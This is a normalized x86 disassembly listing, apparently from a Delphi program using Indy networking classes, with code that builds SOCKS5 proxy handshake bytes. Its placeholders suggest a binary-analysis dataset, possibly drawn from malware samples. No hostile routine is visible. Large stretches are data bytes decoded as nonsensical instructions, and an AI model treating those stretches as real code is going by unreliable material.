add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add [ ecx + ebx * 8 + 0x45 ] bh
add [ eax + 0x1100402a ] dl
push esp
dec ecx
inc ecx
outsb
je r-xdata
xor [ eax ] eax
inc esi
jb r-xdata
adc [ edx + edi * 8 - 0x1 ] ebx
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
add eax [ eax ]
push ss
inc ecx
jo r-xdata
push [ ecx ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
jpe r-xdata
mov [ rw-data ] esi
cmp [ rw-data ] 0x0
je r-xdata
dec ecx
insb
jb r-xdata
add bh bh
add [ eax ] eax
inc edx
popad
jae r-xdata
mov [ esi + 0x30 ] 0x1
mov [ esi + 0x31 ] 0x1
mov [ esi + 0x34 ] 0xfa
mov [ esi + 0x38 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45da12
lea eax [ ebp - 0x4 ]
call sub_404050
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov ebx edx
mov esi eax
xor eax eax
add esp 0xfffffff0
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
mov eax eax
lodsb [ esi ]
fadd [ ebp ]
pop es
adc [ ecx + ecx * 2 + 0x64 ] edx
inc ecx
outsb
je r-xdata
push ebp
push sub_45da0b
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_41a944
test [ esi + 0x1c ] 0x10
je r-xdata
je r-xdata
popad
je r-xdata
inc esi
jb r-xdata
iretd
push esp
adc [ eax ] al
xor al 0x0
add bh bh
xor al 0x0
call sub_4035a0
dec eax
outsd
outsb
arpl [ ecx + 0x74 ] sp
jpe r-xdata
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
jmp r-xdata
nop
push ebp
mov ebp esp
push 0x0
push ebx
push esi
test dl dl
je r-xdata
push 0x64496e65
insb
imul ebp [ edi + 0x6e ] 0x50736148
inc edx
popad
jae r-xdata
popad
jae r-xdata
pushad
fadd [ ebp ]
test al 0xd7
inc ebp
add [ esi ] al
add [ eax ] dl
dec ecx
inc ecx
outsb
je r-xdata
add al 0x0
or ecx [ ecx + 0x64 ]
insb
push esp
imul ebp [ ebp + 0x65 ] 0x74754f
adc [ eax ] al
cmp [ eax ] al
add bh bh
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add eax 0x6e4f0c00
insb
jns r-xdata
inc [ ecx ]
inc esi
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xfa ] al
jpe r-xdata
add [ eax ] al
add [ eax ] al
inc edx
popad
jae r-xdata
add [ eax ] al
cmp dl 0x0
add [ eax ] al
add al 0x0
add [ eax ] dl
inc eax
add [ eax ] dh
add [ eax ] al
push [ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
add [ gs : eax ] dl
inc eax
add [ ecx ] dh
add [ eax ] al
sub_45da30
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a990
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_45da5c
push ebx
push esi
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
mov eax esi
call sub_45daa0
test al al
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x38 ] 0x0
sete al
or bl al
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
sub_45daa0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
call sub_45d400
test al al
jne r-xdata
test al al
je r-xdata
mov al 0x1
retn
mov eax [ rw-data ]
mov al [ eax + 0x30 ]
sub_45dac8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45daed
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45daf4
retn
sub_45de14
push ebp
mov ebp esp
add esp 0xfffffff8
test dl dl
je r-xdata
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41a944
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx ]
xor eax eax
push ebp
push sub_45de86
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ rw-data ] 0x1
jne r-xdata
add esp 0xfffffff0
call sub_4035a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45de8d
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x4 ]
retn
mov eax [ r-xdata ]
call sub_45b790
mov edx [ rw-data ]
mov [ edx ] eax
sub_45deac
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403608
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_41a990
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx ]
xor eax eax
push ebp
push sub_45df13
push [ fs : eax ]
mov [ fs : eax ] esp
dec [ rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45df1a
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x4 ]
retn
mov eax [ rw-data ]
call sub_40d19c
sub_45df38
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_45dfe3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi + 0x32 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45dfea
lea eax [ ebp - 0x10 ]
call sub_404050
lea eax [ ebp - 0x4 ]
call sub_404050
retn
mov eax [ ebp + 0x8 ]
inc eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov edx edi
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
mov ecx [ ebp + 0x8 ]
call sub_408d10
mov eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx esi
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
lea eax [ ebp - 0x4 ]
push eax
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea edx [ ebp - 0xc ]
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
xor ecx ecx
call sub_408d10
mov eax [ ebp - 0x4 ]
push eax
mov ecx ebx
mov edx esi
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
jmp r-xdata
sub_45dff4
push ebx
push esi
xor ebx ebx
mov bl dl
lea ebx [ ebx + ebx * 2 ]
inc [ eax + ebx * 4 + 0x58 ]
cmp [ eax + ebx * 4 + 0x58 ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov [ eax + ebx * 4 + 0x54 ] ecx
xor esi esi
mov [ eax + ebx * 4 + 0x50 ] esi
cmp [ eax + 0x42 ] 0x0
je r-xdata
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_45e02c
push ebx
push esi
xor ebx ebx
mov bl dl
lea esi [ ebx + ebx * 2 ]
cmp [ eax + esi * 4 + 0x58 ] 0x0
jle r-xdata
pop esi
pop ebx
retn
add [ eax + esi * 4 + 0x50 ] ecx
cmp [ eax + 0x3a ] 0x0
je r-xdata
mov ecx [ eax + esi * 4 + 0x50 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_45e05c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
mov al bl
lea edi [ eax + eax * 2 ]
cmp [ esi + edi * 4 + 0x58 ] 0x1
jne r-xdata
dec [ esi + edi * 4 + 0x58 ]
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x4a ] 0x0
je r-xdata
mov ecx ebx
mov edx esi
mov eax [ esi + 0x4c ]
call [ esi + 0x48 ]
sub_45e08c
or [ eax ] eax
add [ eax ] al
xchg ebp eax
inc edi
add [ eax ] bl
0x95600047 0x47
sbb [ edx - 0x6aa3ffb9 ] bl
inc edi
add [ eax ] bl
0x95580047 0x47
sbb [ edx - 0x6aabffb9 ] bl
inc edi
add [ edx + ebx * 4 - 0x6aafffb9 ] cl
inc edi
add al dh
pushfd
inc edi
add [ ebp + edx * 4 + 0x47 ] cl
add [ eax - 0x68 ] bl
inc edi
add [ eax - 0x6b ] cl
inc edi
add [ ebx + ebx * 4 ] ah
inc edi
add [ ebp + edx * 4 + 0x47 ] al
add [ eax ] al
cdq
inc edi
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_45e114
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e11b
retn
mov eax rw-data
mov ecx 0x9
mov edx [ r-xdata ]
call sub_404acc
sub_45e148
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45e16d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e174
retn
sub_45e181
loope r-xdata
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] bh
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
loop r-xdata
mov ah 0xb0
inc ecx
add al dl
xor al 0x40
inc ebp
add [ eax + 0x48 ] dl
inc ecx
add [ esp + ebp * 4 + 0x476c0041 ] bh
inc ecx
add [ ebp + ebp * 4 - 0x539fffbf ] dl
inc ecx
add [ ebp + ebp * 4 - 0x5163ffbf ] ah
inc ecx
add ah cl
mov al 0x41
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add [ esi + ebx * 8 ] dl
inc ebp
add ah dh
fild [ ebp ]
sub al 0xe0
inc ebp
add [ eax + 0x45 ] bl
add [ edx - 0x1d9bffbb ] bl
inc ebp
add [ eax - 0x1e ] ch
inc ebp
add [ eax - 0x5fffbfd6 ] dl
loop r-xdata
int3
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax ] ch
add [ eax ] al
sub al 0xdd
inc ebp
add [ eax + esi * 4 + 0x34d00041 ] dh
inc eax
add [ eax ] al
mov eax eax
add [ eax - 0x6fffbfd6 ] dl
add [ eax + 0x32 ] cl
inc eax
add [ eax - 0x1e ] dh
inc eax
add [ edx ] bh
inc ebp
add [ edi ] al
or al 0x54
dec ecx
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
sub al [ eax ]
nop
sub al [ eax ]
or al 0x54
dec ecx
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
add [ eax - 0x6fffba1e ] ah
sub al [ eax ]
nop
loope r-xdata
mov eax esi
call sub_4035f0
pop esi
pop ebx
retn
add ah al
fld [ ebp ]
add eax [ eax ]
or ecx [ ecx + 0x64 ]
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
add [ ebx + 0x408dc3c0 ] cl
add [ ebp - 0x75 ] dl
in al dx
pop ebp
retn 0x14
sub_45e270
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45deac
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_45e2a4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45e2c9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e2d0
retn
sub_45e590
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_45de14
mov [ esi + 0x68 ] 0x0
mov [ esi + 0x7c ] 0x0
mov [ esi + 0x74 ] 0x438
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_45e5d4
push ebp
mov ebp esp
add esp 0xfffffedc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x124 ] ebx
mov [ ebp - 0x120 ] ebx
mov [ ebp - 0x11c ] ebx
mov [ ebp - 0x118 ] ebx
mov [ ebp - 0x114 ] ebx
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_45e7dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x110 ] 0x4
mov [ ebp - 0x10f ] 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov [ ebp - 0x10e ] ax
cmp [ esi + 0x7c ] 0x2
jne r-xdata
lea ecx [ ebp - 0x114 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_45b79c
mov edx [ ebp - 0x114 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45bd54
mov [ ebp - 0x10c ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx r-xdata
call sub_45bd54
mov [ ebp - 0x10c ] eax
jmp r-xdata
add ebx 0x9
lea edx [ ebp - 0x110 ]
mov ecx ebx
mov eax [ esi + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x58 ]
lea edx [ ebp - 0x8 ]
mov ecx 0x8
mov eax [ esi + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x54 ]
mov al [ ebp - 0x7 ]
sub al 0x5a
je r-xdata
mov eax edi
call sub_404310
push eax
mov eax edi
call sub_404510
lea edx [ ebp + ebx - 0x106 ]
pop ecx
call sub_4028e0
mov eax edi
call sub_404310
inc ebx
add eax ebx
mov ebx eax
mov [ ebp + ebx - 0x107 ] 0x0
lea eax [ ebp - 0x108 ]
mov edx [ esi + 0x78 ]
mov ecx 0xff
call sub_4042ec
xor ebx ebx
mov bl [ ebp - 0x108 ]
mov [ ebp + ebx - 0x107 ] 0x0
cmp [ esi + 0x7c ] 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e7e4
lea eax [ ebp - 0x124 ]
mov edx 0x5
call sub_404074
retn
dec al
je r-xdata
lea edx [ ebp - 0x118 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x118 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x11c ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x11c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x120 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x120 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x124 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x124 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
sub_45e7fc
push ebp
mov ebp esp
push ecx
mov ecx 0x29
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_45edcf
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x68 ] 0x0
jne r-xdata
mov [ ebp - 0x10e ] 0x2
mov [ ebp - 0x10e ] 0x0
jmp r-xdata
mov al [ ebp - 0x10f ]
cmp al [ ebp - 0xd ]
jne r-xdata
mov al [ ebp - 0x10e ]
mov [ ebp - 0xd ] al
mov [ ebp - 0x110 ] 0x5
mov al 0x1
mov [ ebp - 0x10f ] al
and eax 0xff
add eax 0x2
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx [ ebp - 0xc ]
mov esi [ eax ]
call [ esi + 0x58 ]
xor edx edx
push ebp
push j_sub_403848#5
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx 0x2
mov esi [ eax ]
call [ esi + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0x118 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x118 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
cmp al 0xff
jne r-xdata
mov [ ebp - 0x110 ] 0x5
mov [ ebp - 0x10f ] 0x1
mov [ ebp - 0x10e ] 0x0
mov [ ebp - 0x10d ] 0x3
mov eax [ ebp - 0x4 ]
call sub_404310
mov [ ebp - 0x10c ] al
mov esi 0x5
mov eax [ ebp - 0x4 ]
call sub_404310
test eax eax
jle r-xdata
mov [ ebp - 0x110 ] 0x1
mov eax [ ebx + 0x78 ]
call sub_404310
mov [ ebp - 0x10f ] al
mov esi 0x2
mov eax [ ebx + 0x78 ]
call sub_404310
test eax eax
jle r-xdata
cmp [ ebx + 0x68 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_404310
add esi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov [ ebp - 0x10 ] ax
lea edx [ ebp + esi - 0x110 ]
lea eax [ ebp - 0x10 ]
mov ecx 0x2
call sub_4028e0
add esi 0x2
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx esi
mov esi [ eax ]
call [ esi + 0x58 ]
xor eax eax
push ebp
push sub_45eb2f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx 0x5
mov esi [ eax ]
call [ esi + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_404310
push eax
mov eax [ ebp - 0x4 ]
call sub_404510
lea edx [ ebp + esi - 0x110 ]
pop ecx
call sub_4028e0
mov eax [ ebx + 0x78 ]
call sub_404310
add esi eax
mov eax [ ebx + 0x70 ]
call sub_404310
mov [ ebp + esi - 0x110 ] al
inc esi
mov eax [ ebx + 0x70 ]
call sub_404310
test eax eax
jle r-xdata
mov eax [ ebx + 0x78 ]
call sub_404310
push eax
mov eax [ ebx + 0x78 ]
call sub_404510
lea edx [ ebp + esi - 0x110 ]
pop ecx
call sub_4028e0
xor eax eax
mov al [ ebp - 0x10f ]
cmp eax 0x8
ja r-xdata
mov eax [ ebx + 0x70 ]
call sub_404310
add esi eax
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx esi
mov esi [ eax ]
call [ esi + 0x58 ]
xor edx edx
push ebp
push sub_45e9f3
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx 0x2
mov esi [ eax ]
call [ esi + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebx + 0x70 ]
call sub_404310
push eax
mov eax [ ebx + 0x70 ]
call sub_404510
lea edx [ ebp + esi - 0x110 ]
pop ecx
call sub_4028e0
lea edx [ ebp - 0x148 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x148 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
jmp [ eax * 4 + r-xdata ]
cmp [ ebp - 0x10f ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x6
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x128 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
jmp r-xdata
lea edx [ ebp - 0x120 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x120 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
xor eax eax
push ebp
push j_sub_40371c#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0xc ]
dec ecx
lea edx [ ebp - 0x10b ]
mov eax [ ebx + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_45edb1
xor eax eax
mov al [ ebp - 0x10c ]
add eax 0x2
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x10d ]
dec al
je r-xdata
mov [ ebp - 0xc ] 0x12
jmp r-xdata
sub_45eb87
add [ 0x510045ec ] ah
in al dx
inc ebp
add [ ebp - 0x14 ] bh
inc ebp
add [ esi - 0x30ffba14 ] ah
in al dx
inc ebp
add cl ch
jle r-xdata
add [ ebp - 0x1276b ] cl
jmp [ ecx + rw-data ]
add [ eax ] al
lea edx [ ebp - 0x128 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x128 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
jmp r-xdata
mov al [ ebp - 0x10d ]
dec al
je r-xdata
mov [ ebp - 0xc ] 0x6
jmp r-xdata
sub al 0x2
je r-xdata
xor eax eax
push ebp
push j_sub_40371c#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0xc ]
dec ecx
lea edx [ ebp - 0x10b ]
mov eax [ ebx + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_45edb1
xor eax eax
mov al [ ebp - 0x10c ]
add eax 0x2
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0xc ] 0x12
jmp r-xdata
sub_45ede0
push ebx
mov bl [ eax + 0x7c ]
dec ebx
sub bl 0x2
jb r-xdata
call sub_45e5d4
pop ebx
retn
je r-xdata
call sub_45e7fc
jmp r-xdata
pop ebx
retn
sub_45edfc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45ee21
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ee28
retn
sub_45ee38
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shr dh 0x45
add [ eax - 0x11 ] ch
inc ebp
add [ eax + 0x45ef ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x2c0045ef ] al
add [ eax ] al
add [ ebp + ebx + 0x34c40041 ] bl
popad
outsb
insb
jae r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
popad
outsb
insb
mov eax eax
cwde
out dx eax
inc ebp
add [ edi ] al
andps xmm1 [ ecx + 0x64 ]
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add al al
out dx al
inc ebp
add [ edi ] al
adc [ ecx + ecx * 2 + 0x64 ] dl
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax ] al
[ eax + eax ]
outsd
jb r-xdata
push esp
adc [ eax ] al
sub [ eax ] al
add bh bh
sub [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
or eax 0x65696c43
popad
outsb
insb
cmp al 0xef
inc ebp
add [ eax ] ch
push ds
inc ecx
add [ eax + eax ] al
push cs
dec ecx
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
inc eax
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
sub al 0x0
add [ eax ] al
pushfd
sbb eax 0x34c40041
popad
outsb
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add cl dh
pushfd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + esi * 8 + 0xc0045 ] bl
add [ eax ] al
xor [ ebx + 0x34c40045 ] dl
inc eax
add al dl
xor al 0x40
add ah dl
dec ebp
imul ebp [ esi + 0x54 ] 0x28004010
add [ eax ] al
[ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
outsd
jb r-xdata
outsb
je r-xdata
add [ 0x65696c43 ] cl
add [ eax ] al
or eax 0x65696c43
outsb
je r-xdata
popad
outsb
insb
add [ eax + 0x200045ee ] ch
add [ eax ] al
add [ eax ] ch
pop ds
inc ecx
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add ah dh
dec esp
inc ecx
add [ eax + 0x48 ] dl
inc ecx
add [ eax + 0x48 ] bl
inc ecx
add [ eax + 0x4d ] ah
inc ecx
add [ ecx + edx * 2 + 0x41 ] dh
add [ eax + 0x51 ] bh
inc ecx
add [ ecx + edx * 2 + 0x41 ] bh
add [ ecx + edx * 2 + 0x41 ] ch
add [ eax + 0x51 ] dh
inc ecx
add al bh
dec ebp
inc ecx
add [ esi + ecx * 2 + 0x41 ] dh
add [ eax ] dl
push esp
dec ecx
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
out dx al
inc ebp
add [ eax + 0x411f ] bh
add [ esi ] cl
dec ecx
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45150040 ] al
dec ecx
inc ebx
outsd
jne r-xdata
popad
outsb
insb
inc ebp
jb r-xdata
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45140040 ] al
dec ecx
push ebx
outsd
dec ebp
popad
js r-xdata
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax + 0x500045f2 ] cl
dec eax
inc ecx
add [ eax + 0x48 ] bl
inc ecx
add al ah
test [ ebp ] 0x68
dec ebx
inc ecx
add [ eax + 0x4c ] cl
inc ecx
add [ eax + 0x4c ] bh
inc ecx
add [ eax + 0x4c ] dh
inc ecx
add [ ebp + esi * 8 + 0x45 ] al
add [ edx + esi * 8 ] bl
inc ebp
add [ eax - 0xe ] dl
inc ebp
add [ eax - 0xd ] al
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x140040 ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
sbb [ eax ] al
add [ eax ] al
andps xmm1 [ ecx + 0x64 ]
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
inc eax
popad
outsb
insb
add [ gs : eax ] al
lea eax [ eax ]
cmp al 0xef
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 8 + 0x45 ] ah
outsd
jb r-xdata
add al 0x0
push esp
adc [ eax ] al
and al 0x0
add bh bh
and al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bh bh
add [ eax ] eax
adc [ eax ] al
adc al 0x0
add bh bh
adc al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add cl [ ecx + 0x50 ]
push esp
adc [ eax ] al
sbb al 0x0
add bh bh
